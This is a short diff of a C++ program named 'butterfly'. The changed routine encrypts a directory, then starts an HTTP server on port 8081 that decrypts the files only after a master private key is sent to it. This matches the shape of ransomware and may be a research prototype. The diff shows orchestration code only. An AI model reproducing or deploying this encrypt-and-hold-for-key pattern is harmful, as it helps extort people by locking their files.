@@ -18,10 +18,8 @@ Butterfly::Butterfly(int argc, char *argv[]) : _argparse(new butterfly::Argument
 void Butterfly::run()
 {
 
-    std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(8081);
-    server->run();
 
-    /*
+
     // Start Encryption + Decryption
     if ( !_args._dir.empty() )
     {
@@ -30,11 +28,16 @@ void Butterfly::run()
         std::cout << "Start Encryption+Decryption from directory " << _args._dir << std::endl;
         encryptor->invokeDir(_args._dir, _args._protected);
 
-        sleep(5);
+        //sleep(5);
 
         // start decryption
-        std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
-        decryptor->invokeDir(_args._dir, "/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem");
+        std::shared_ptr<butterfly::hybrid::Decryptor> decryptor = std::make_shared<butterfly::hybrid::Decryptor>();
+        decryptor->setDirPath(_args._dir);
+        //decryptor->invokeDir("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem");
+
+        std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(8081);
+        server->registerMasterPKeyCB(std::bind(&hybrid::Decryptor::invokeDir, decryptor, std::placeholders::_1));
+        server->run();
 
     }
         // Start only Encryption
@@ -51,12 +54,13 @@ void Butterfly::run()
     {
         std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
         std::cout << "Start Decryption from directory " << _args._decrypt << std::endl;
-        decryptor->invokeDir(_args._decrypt, _args._serverpKey);
+        decryptor->setDirPath(_args._decrypt);
+        decryptor->invokeDir(_args._serverpKey);
     } else
     {
         throw ButterflyException("Invalid usage of the Arguments!");
     }
-     */
+
 }
 
 } // namespace butterfly
